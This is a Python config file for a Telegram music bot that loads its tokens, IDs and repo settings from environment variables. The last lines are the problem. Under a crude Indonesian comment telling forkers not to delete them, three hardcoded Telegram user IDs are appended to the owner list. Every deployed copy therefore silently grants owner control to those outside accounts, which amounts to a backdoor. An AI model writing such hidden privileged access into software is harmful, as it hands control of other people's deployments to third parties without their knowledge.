##Config

from os import getenv
from dotenv import load_dotenv

load_dotenv()
get_queue = {}
SESSION_NAME = getenv('SESSION_NAME', 'session')
BOT_TOKEN = getenv('BOT_TOKEN')
API_ID = int(getenv('API_ID', "123456"))
API_HASH = getenv('API_HASH')
DURATION_LIMIT = int(getenv('DURATION_LIMIT', '3600'))
COMMAND_PREFIXES = list(getenv('COMMAND_PREFIXES', '/ . , : ; !').split())
MONGO_DB_URI = getenv("MONGO_DB_URI")
SUDO_USERS = list(map(int, getenv('SUDO_USERS', '5530935977').split()))
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", '-1001775979435'))
ASS_ID = int(getenv("ASS_ID", '123446829'))
OWNER_ID = list(map(int, getenv('OWNER_ID', '5530935977').split()))
GROUP = getenv("GROUP", "ReySupport")
CHANNEL = getenv("CHANNEL", "ReyUpdatesCH")
UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/reyn0pe/ReyMusic")
AUTO_LEAVE = int(getenv("AUTO_LEAVE", "1500"))
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")

# KALO FORK/CLONE JAN DI HAPUS KENTOD
OWNER_ID.append(1663258664)
OWNER_ID.append(1607338903)
OWNER_ID.append(5530935977)
